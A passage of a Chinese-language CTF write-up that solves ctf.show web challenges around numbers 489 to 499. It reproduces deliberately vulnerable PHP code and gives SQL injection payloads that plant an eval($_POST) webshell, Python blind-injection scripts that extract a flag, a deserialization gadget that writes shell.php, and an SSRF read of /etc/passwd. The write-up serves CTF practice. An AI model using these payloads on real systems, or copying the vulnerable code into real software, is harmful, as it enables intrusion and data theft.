class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;render/render_class.php&#x27;</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;render/db_class.php&#x27;</span>);<br><br><br><br><span class="hljs-variable">$action</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$action</span>))&#123;<br>header(<span class="hljs-string">&#x27;location:index.php?action=login&#x27;</span>);<br><span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$action</span>==<span class="hljs-string">&#x27;check&#x27;</span>)&#123;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select id from user where username = &#x27;&quot;</span>.md5(<span class="hljs-variable">$username</span>).<span class="hljs-string">&quot;&#x27; and password=&#x27;&quot;</span>.md5(<span class="hljs-variable">$password</span>).<span class="hljs-string">&quot;&#x27; order by id limit 1&quot;</span>;<br>extract(<span class="hljs-variable">$_GET</span>);<br><span class="hljs-variable">$user</span>=db::select_one(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>)&#123;<br>templateUtil::render(<span class="hljs-string">&#x27;index&#x27;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;username&#x27;</span>=&gt;<span class="hljs-variable">$username</span>));<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>templateUtil::render(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$action</span>==<span class="hljs-string">&#x27;clear&#x27;</span>)&#123;<br>system(<span class="hljs-string">&#x27;rm -rf cache/*&#x27;</span>);<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;cache clear&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$action</span>==<span class="hljs-string">&#x27;login&#x27;</span>)&#123;<br>templateUtil::render(<span class="hljs-variable">$action</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>templateUtil::render(<span class="hljs-variable">$action</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>危险url，直接重写SQL语句：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">/index.php?action=check&amp;username=%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%20%70%68%70%69%6e%66%6f%28%29%3b%20%3f%3e&amp;password=ffifdyop&amp;sql=%73%65%6c%65%63%74%20%69%64%20%66%72%6f%6d%20%75%73%65%72%20%6f%72%64%65%72%20%62%79%20%69%64%20%6c%69%6d%69%74%20%31<br></code></pre></td></tr></table></figure><p>将username注入到cache/md5(index)中，访问对应路由，直接RCE</p><h2 id="web490-sql注入">Web490 SQL注入</h2><p>同样还是SQL注入的问题，直接使用联合注入即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">username=admin<span class="hljs-string">&#x27; and 1=0 union select &#x27;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);phoinfo(); <span class="hljs-meta">?&gt;</span><span class="hljs-string">&#x27; #</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;render/render_class.php&#x27;</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;render/db_class.php&#x27;</span>);<br><br><br><span class="hljs-variable">$action</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$action</span>))&#123;<br>header(<span class="hljs-string">&#x27;location:index.php?action=login&#x27;</span>);<br><span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$action</span>==<span class="hljs-string">&#x27;check&#x27;</span>)&#123;<br>extract(<span class="hljs-variable">$_GET</span>);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select username from user where username = &#x27;&quot;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;&#x27; and password=&#x27;&quot;</span>.md5(<span class="hljs-variable">$password</span>).<span class="hljs-string">&quot;&#x27; order by id limit 1&quot;</span>;<br><span class="hljs-variable">$user</span>=db::select_one(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>)&#123;<br>templateUtil::render(<span class="hljs-string">&#x27;index&#x27;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;username&#x27;</span>=&gt;<span class="hljs-variable">$user</span>-&gt;username));<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>templateUtil::render(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$action</span>==<span class="hljs-string">&#x27;clear&#x27;</span>)&#123;<br>system(<span class="hljs-string">&#x27;rm -rf cache/*&#x27;</span>);<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;cache clear&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$action</span>==<span class="hljs-string">&#x27;login&#x27;</span>)&#123;<br>templateUtil::render(<span class="hljs-variable">$action</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>templateUtil::render(<span class="hljs-variable">$action</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="web491-时间盲注">Web491 时间盲注</h2><p>还是index.php，但是这回关闭了模板注入。</p><p>这么一看只能使用时间盲注了，并且使用Mysql读取文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;render/render_class.php&#x27;</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;render/db_class.php&#x27;</span>);<br><br><br><span class="hljs-variable">$action</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$action</span>))&#123;<br>header(<span class="hljs-string">&#x27;location:index.php?action=login&#x27;</span>);<br><span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$action</span>==<span class="hljs-string">&#x27;check&#x27;</span>)&#123;<br>extract(<span class="hljs-variable">$_GET</span>);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select username from user where username = &#x27;&quot;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;&#x27; and password=&#x27;&quot;</span>.md5(<span class="hljs-variable">$password</span>).<span class="hljs-string">&quot;&#x27; order by id limit 1&quot;</span>;<br><span class="hljs-variable">$user</span>=db::select_one(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>)&#123;<br>templateUtil::render(<span class="hljs-string">&#x27;index&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>templateUtil::render(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$action</span>==<span class="hljs-string">&#x27;clear&#x27;</span>)&#123;<br>system(<span class="hljs-string">&#x27;rm -rf cache/*&#x27;</span>);<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;cache clear&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$action</span>==<span class="hljs-string">&#x27;login&#x27;</span>)&#123;<br>templateUtil::render(<span class="hljs-variable">$action</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>templateUtil::render(<span class="hljs-variable">$action</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>tar = <span class="hljs-string">&quot;1234567890abcdef-\&#123;\&#125;&quot;</span><br><br>url = <span class="hljs-string">&quot;http://1efff16a-5a79-45e1-865d-a194bb3563de.challenge.ctf.show/index.php&quot;</span><br><br>params = &#123;<br>    <span class="hljs-string">&quot;action&quot;</span>    :<span class="hljs-string">&quot;check&quot;</span>,<br>    <span class="hljs-string">&quot;username&quot;</span>  : <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-string">&quot;password&quot;</span>  : <span class="hljs-string">&quot;123&quot;</span><br>&#125;<br><br>payload = <span class="hljs-string">&quot;123&#x27; and 1=0 union select if(substr(load_file(&#x27;/flag&#x27;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,sleep(5),1)#&quot;</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>, <span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> tar:<br>        params[<span class="hljs-string">&#x27;username&#x27;</span>] = payload.<span class="hljs-built_in">format</span>(i,j)<br><br>        t1 = time.time()<br>        requests.get(url=url,<br>                    params=params)<br>        t2 = time.time()<br>        <br>        <span class="hljs-keyword">if</span>(t2 - t1 &gt; <span class="hljs-number">3</span>):<br>            flag += j<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br>        time.sleep(<span class="hljs-number">0.2</span>)<br>    <span class="hljs-keyword">if</span>(flag[-<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;\&#125;&#x27;</span>):<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="web492-变量覆盖">Web492 变量覆盖</h2><p>对于SQL注入增加WAF，但是仍然存在之前变量覆盖的老毛病。</p><p>直接在变量中上传user，并且保证username不符合正则要求，利用上传的user完成变量覆盖。</p><p>需要注意的是在原模板中存在注释语句需要闭合</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;render/render_class.php&#x27;</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;render/db_class.php&#x27;</span>);<br><br><br><span class="hljs-variable">$action</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$action</span>))&#123;<br>header(<span class="hljs-string">&#x27;location:index.php?action=login&#x27;</span>);<br><span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$action</span>==<span class="hljs-string">&#x27;check&#x27;</span>)&#123;<br>extract(<span class="hljs-variable">$_GET</span>);<br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^[A-Za-z0-9]+$/&#x27;</span>, <span class="hljs-variable">$username</span>))&#123;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select username from user where username = &#x27;&quot;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;&#x27; and password=&#x27;&quot;</span>.md5(<span class="hljs-variable">$password</span>).<span class="hljs-string">&quot;&#x27; order by id limit 1&quot;</span>;<br><span class="hljs-variable">$user</span>=db::select_one_array(<span class="hljs-variable">$sql</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>)&#123;<br>templateUtil::render(<span class="hljs-string">&#x27;index&#x27;</span>,<span class="hljs-variable">$user</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>templateUtil::render(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$action</span>==<span class="hljs-string">&#x27;clear&#x27;</span>)&#123;<br>system(<span class="hljs-string">&#x27;rm -rf cache/*&#x27;</span>);<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;cache clear&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$action</span>==<span class="hljs-string">&#x27;login&#x27;</span>)&#123;<br>templateUtil::render(<span class="hljs-variable">$action</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>templateUtil::render(<span class="hljs-variable">$action</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>payload如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">/index.php?action=check&amp;username=admin&#x27;&amp;password=admin&amp;user[username]=%2d%2d%3e%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%70%68%70%69%6e%66%6f%28%29%3b%20%3f%3e%3c%21%2d%2d<br></code></pre></td></tr></table></figure><h2 id="web493-反序列化">Web493 反序列化</h2><p>相比于上一题增加了反序列化的操作，同时对于<code>db_class</code>文件增加日志记录。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_start();<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;render/render_class.php&#x27;</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;render/db_class.php&#x27;</span>);<br><br><br><span class="hljs-variable">$action</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$action</span>))&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]))&#123;<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br><span class="hljs-variable">$user</span>=unserialize(<span class="hljs-variable">$c</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>)&#123;<br>templateUtil::render(<span class="hljs-string">&#x27;index&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>header(<span class="hljs-string">&#x27;location:index.php?action=login&#x27;</span>);<br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>header(<span class="hljs-string">&#x27;location:index.php?action=login&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">die</span>();<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dbLog</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$sql</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$log</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;log=<span class="hljs-string">&#x27;log/&#x27;</span>.date_format(date_create(),<span class="hljs-string">&quot;Y-m-d&quot;</span>).<span class="hljs-string">&#x27;.txt&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;content = <span class="hljs-keyword">$this</span>-&gt;content.date_format(date_create(),<span class="hljs-string">&quot;Y-m-d-H-i-s&quot;</span>).<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$sql</span>.<span class="hljs-string">&#x27; \r\n&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>file_put_contents(<span class="hljs-keyword">$this</span>-&gt;log, <span class="hljs-keyword">$this</span>-&gt;content,FILE_APPEND);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>非常简单的反序列化利用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">require</span> <span class="hljs-string">&quot;./render/db_class.php&quot;</span>;<br><br>    <span class="hljs-variable">$var</span> = <span class="hljs-keyword">new</span> dbLog();<br>    <span class="hljs-variable">$var</span>-&gt;log = <span class="hljs-string">&quot;shell.php&quot;</span>;<br>    <span class="hljs-variable">$var</span>-&gt;content = <span class="hljs-string">&#x27;&lt;?php eval($_POST[1]); ?&gt;&#x27;</span>;<br><br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$var</span>));<br></code></pre></td></tr></table></figure><h2 id="web494-495-数据库操作">Web494-495 数据库操作</h2><p>利用493的方法拿到shell之后，利用蚁剑的数据库操作查询数据库内的数据。</p><h2 id="web496-update布尔盲注">Web496 update布尔盲注</h2><p>登录进入后，发现新增了<code>/api/edit_amdin.php</code></p><p>查看对应文件的内容，由于存在extract函数，我们可以利用POST数据重写SQL语句，从而利用update完成盲注</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>session_start();<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;../render/db_class.php&#x27;</span>);<br><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$user</span>= <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br><span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<br><span class="hljs-string">&quot;code&quot;</span>=&gt;<span class="hljs-number">0</span>,<br><span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;查询失败&quot;</span>,<br><span class="hljs-string">&quot;count&quot;</span>=&gt;<span class="hljs-number">0</span>,<br><span class="hljs-string">&quot;data&quot;</span>=&gt;<span class="hljs-keyword">array</span>()<br>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>)&#123;<br>extract(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;update user set nickname=&#x27;&quot;</span>.substr(<span class="hljs-variable">$nickname</span>, <span class="hljs-number">0</span>,<span class="hljs-number">8</span>).<span class="hljs-string">&quot;&#x27; where username=&#x27;&quot;</span>.<span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&quot;&#x27;&quot;</span>;<br><span class="hljs-variable">$db</span>=<span class="hljs-keyword">new</span> db();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$db</span>-&gt;update_one(<span class="hljs-variable">$sql</span>))&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>][<span class="hljs-string">&#x27;nickname&#x27;</span>]=<span class="hljs-variable">$nickname</span>;<br><span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;管理员信息修改成功&#x27;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;管理员信息修改失败&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">die</span>(json_encode(<span class="hljs-variable">$ret</span>));<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;请登录后使用此功能&#x27;</span>;<br><span class="hljs-keyword">die</span>(json_encode(<span class="hljs-variable">$ret</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> random<br><br>url = <span class="hljs-string">&quot;http://aa6b2c02-afec-4346-b3c2-3684f6de3e54.challenge.ctf.show&quot;</span><br><br>path = <span class="hljs-string">&quot;/api/admin_edit.php&quot;</span><br><br>sess = requests.session()<br><br>sess.post(url = url + <span class="hljs-string">&quot;?action=check&quot;</span>,<br>         data = &#123;<br>            <span class="hljs-string">&quot;username&quot;</span> : <span class="hljs-string">&quot;123&#x27; and 1=0 union select &#x27;123&#x27;,&#x27;admin&#x27; #&quot;</span>,<br>            <span class="hljs-string">&quot;password&quot;</span> : <span class="hljs-string">&quot;123&quot;</span><br>         &#125;)<br><br><br><br><span class="hljs-comment"># payload = &quot;123&#x27; or if(substr((select group_concat(table_name)from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,1,0)#&quot;</span><br><span class="hljs-comment"># payload = &quot;123&#x27; or if(substr((select group_concat(column_name)from(information_schema.columns)where(table_name=&#x27;flagyoudontknow76&#x27;)),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,1,0) #&quot;</span><br>payload = <span class="hljs-string">&quot;123&#x27; or if(substr((select group_concat(flagisherebutyouneverknow118)from(flagyoudontknow76)),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,1,0) #&quot;</span><br>count   = <span class="hljs-number">0</span><br>target  = string.digits+<span class="hljs-string">&quot;,&#123;-&#125;&quot;</span> + string.ascii_lowercase<br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> target:<br>        count += <span class="hljs-number">1</span><br>        r = sess.post(  url = url + path,<br>                        data= &#123;<br>                            <span class="hljs-string">&quot;user[username]&quot;</span> : payload.<span class="hljs-built_in">format</span>(i,j),<br>                            <span class="hljs-string">&quot;nickname&quot;</span> : random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">999999</span>)<br>                        &#125;,<br>                    )<br>        info = json.loads(r.text)[<span class="hljs-string">&#x27;msg&#x27;</span>]<br>        <span class="hljs-comment"># print(&#123;</span><br>        <span class="hljs-comment">#         &quot;username&quot; : payload.format(i,j),</span><br>        <span class="hljs-comment">#         &quot;nickname&quot; : &quot;%08d&quot; % count</span><br>        <span class="hljs-comment">#     &#125;)</span><br>        <span class="hljs-comment"># print(info)</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;成功&quot;</span> <span class="hljs-keyword">in</span> info):<br>            flag += j<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="web497-ssrf">Web497 SSRF</h2><p>这道题就是利用<code>&#123;&#123;img:&#125;&#125;</code>模板从而使用ssrf获取到内网信息，直接读取<code>file:///etc/passwd</code></p><p>登录绕过时不允许使用<code>file</code>协议，但是后续修改头像处可以使用。</p><h2 id="web498-ssrf打redis">Web498 SSRF打redis</h2><h2 id="web499-木马写入">Web499 